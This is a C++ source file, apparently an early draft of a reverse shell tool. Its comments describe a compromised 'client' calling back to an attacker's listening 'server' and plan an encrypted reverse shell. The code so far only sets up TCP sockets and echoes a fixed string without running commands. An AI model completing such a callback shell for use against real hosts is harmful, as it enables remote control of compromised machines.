#include "utils.h"
#include "args_parser.h"

// placeholder for now
void server(const std::string &serverIpAddr, unsigned int portNum) {
    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET; // define IPV4
    serverAddr.sin_port = htons(portNum); // set port, htons coverts port to byte order
    serverAddr.sin_addr.s_addr = inet_addr(serverIpAddr.c_str()); // listen on any available IP (allow further config?)

    bind(serverSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr));

    // socket, max number of queued connections

    listen(serverSocket, 5);

    // get info on connecting client
    struct sockaddr_storage clientAddr;
    socklen_t clientAddrLen = sizeof(clientAddr);
    char clientIpAddr[INET_ADDRSTRLEN];

    int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);

    struct sockaddr_in *s = (struct sockaddr_in *)&clientAddr;
    int clientPort = ntohs(s->sin_port); // converts byte to port number
    inet_ntop(AF_INET, &s->sin_addr, clientIpAddr, sizeof clientIpAddr); // get readable ipv4 addr

    std::cout << "[+] Connection Received from: " << clientIpAddr << " On Port: " << clientPort << std::endl;

    char buffer[1024];
    while (true) {

        // placeholder
        std::cout << "[client_hostname] ";

        std::string msgToSend;
        std::getline(std::cin, msgToSend);

        send(clientSocket, msgToSend.c_str(), msgToSend.length(), 0);

        memset(buffer, 0, sizeof(buffer));
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);

        if (bytesReceived <= 0) {
            std::cout << "[!] Client Disconnected!" << std::endl;
            break;
        }

        if (std::string(buffer) == "exit") {
            std::cout << "[!] Received exit from Client!" << std::endl;
            break;
        }

        std::cout << "[->]: " << buffer << std::endl;
    }

    close(serverSocket);
}


void client(const std::string &ipAddr, unsigned int portNum) {

    int clientSocket = socket(AF_INET, SOCK_STREAM, 0);

    // specifying address
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(portNum);
    serverAddr.sin_addr.s_addr = inet_addr(ipAddr.c_str());

    connect(clientSocket, (struct sockaddr*)&serverAddr,sizeof(serverAddr));

    std::cout << "[+] Connected to server successfully" << std::endl;

    char buffer[1024];
    // sending connection request
    while (true){

        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);

        if (bytesReceived >= 0) {
            //std::cout << "[+] Msg received: " << buffer << std::endl;
        }

        if (std::string(buffer) == "exit") {
            std::cout << "[!] Received exit from Server!" << std::endl;
            break;
        }

        // sending data
        memset(buffer, 0, sizeof(buffer));

        std::string tmpStr = "RESPONSE FROM SHELL";

        const char* message = tmpStr.c_str();

        send(clientSocket, message, strlen(message), 0);
    }

    // closing socket
    close(clientSocket);

}

int main(int argc, char *argv[]) {


    /*  Program Layout
     *  User passes argument 'client' or 'server'
     *  'client' would be a compromised host attempting to connect back to attacker
     *  'server' would be an attacker waiting for a connection
     *
     *  if 'server' arg passed, we just need one parameter and that's a port number to listen on (default 443)
     *
     *  if 'client' arg passed, we need the IPv4 addr and PORT number of the 'server'
     *
     *  then connect and set up an encrypted rev shell (method undecided)
     */
    struct config cfg = parse_args(argc, argv);

    if (cfg.execType == "server") {
        server(cfg.ipAddr, cfg.portNum);
    }
    else {
        client(cfg.ipAddr, cfg.portNum);
    }

    return 0;
}

